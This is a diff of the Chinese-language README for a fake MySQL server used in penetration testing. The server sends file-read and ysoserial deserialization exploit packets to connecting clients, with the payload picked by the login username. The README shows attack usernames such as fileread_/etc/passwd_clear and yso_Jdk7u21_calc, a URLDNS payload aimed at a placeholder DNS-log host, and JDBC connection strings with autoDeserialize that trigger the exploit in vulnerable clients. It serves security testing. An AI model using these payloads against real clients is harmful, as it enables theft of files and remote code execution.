@@ -1,8 +1,6 @@
 # MySQL Fake Server
 用于渗透测试过程中的假MySQL服务器，纯原生python3实现，不依赖其它包。
 
-无需编译MySQL插件，无需每次修改需要读取的文件。
-
 修改自项目https://github.com/waldiTM/python-mysqlproto
 
 ## 用途
@@ -12,9 +10,11 @@
 
 ## 说明
 1. 需要python3环境，无任何其它依赖。
-2. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能。
-3. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
-4. 运行：`python server.py`
+2. 根据**登录用户名**返回文件读取利用报文、反序列化利用报文。
+3. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能。
+4. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
+5. 运行：`python server.py`
+6. config.ini中预置了一部分配置信息
 
 ## 测试环境：
 1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化（JRE8u20）、文件读取)
@@ -29,8 +29,8 @@
     - 可在config.json中yso节预定义好yso payload的生成参数，key为用户名，value为ysoserial的参数
     - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就使用用户名yso\_Jdk7u21\_calc）
     - jdbc连接串示例：
-      - 8.0.7以上：`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
-      - 5.x:`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
+      - `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
+      - `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
 3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
     - **例如：** fileread\_/etc/passwd_clear
 
@@ -54,9 +54,9 @@ JDK 1.8.20+mysql-connector-java 8.0.14反序列化，使用用户名：yso_JRE8u
 4. `SHOW SESSION STATUS`和`SHOW COLLATION`的公用列是第二列
 5. mysql java connector 5.x的环境下，需要返回的server版本大于等于5.0.0才会走到`Util.resultSetToMap`进入getObject
 
-## 顺便招个聘
+## 招聘了招聘~
 
-欢迎各位大佬投递简历，大家一起来愉快地玩耍~^_^
+360云安全团队目前大量招聘中，欢迎各位大佬投递简历，大家一起来愉快地玩耍~^_^
 
 https://www.anquanke.com/post/id/200462
 
@@ -65,8 +65,6 @@ https://www.anquanke.com/post/id/200462
 **项目基础：**
 
 https://github.com/waldiTM/python-mysqlproto
-
-膜拜大佬实现的Python版mysql协议，一切都是在此项目上进行的修改。
 
 **漏洞相关:**
 
